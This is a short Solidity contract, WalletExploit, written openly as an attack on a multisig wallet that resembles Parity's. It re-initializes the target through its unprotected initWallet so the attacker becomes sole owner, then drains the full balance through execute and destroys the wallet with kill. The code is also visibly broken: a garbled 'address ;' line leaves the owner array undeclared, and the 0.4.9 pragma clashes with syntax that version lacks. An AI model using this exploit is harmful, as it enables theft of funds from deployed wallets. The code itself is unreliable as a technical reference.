pragma solidity 0.4.9;

contract WalletExploit {
    address public targetWallet;

    constructor(address _targetWallet) public {
        targetWallet = _targetWallet;
    }

    // Re-initialize the wallet with attacker as sole owner
    function attackInitWallet() public {
        address ;
        attackers[0] = address(this); // attacker becomes the sole owner

        // craft encoded payload to call initWallet(address[], uint, uint)
        bytes memory payload = abi.encodeWithSignature("initWallet(address[],uint256,uint256)", attackers, 1, 1);

        // call fallback to trigger delegatecall with malicious data
        targetWallet.call(payload);
    }

    // Now we own the wallet, call execute to drain funds
    function drain(address recipient) public {
        bytes memory emptyData = ""; // no data
        // calling execute() to send ETH from wallet to recipient
        bytes memory payload = abi.encodeWithSignature("execute(address,uint256,bytes)", recipient, address(targetWallet).balance, emptyData);

        targetWallet.call(payload);
    }

    // Call kill function to destroy wallet and send funds to attacker
    function destroyWallet(address _to) public {
        // Note: msg.data needs to match the hash expected in onlymanyowners, here we just reuse delegatecall.
        bytes memory payload = abi.encodeWithSignature("kill(address)", _to);
        targetWallet.call(payload);
    }

    // Receive ETH if wallet sends to us
    function() public payable {}
}

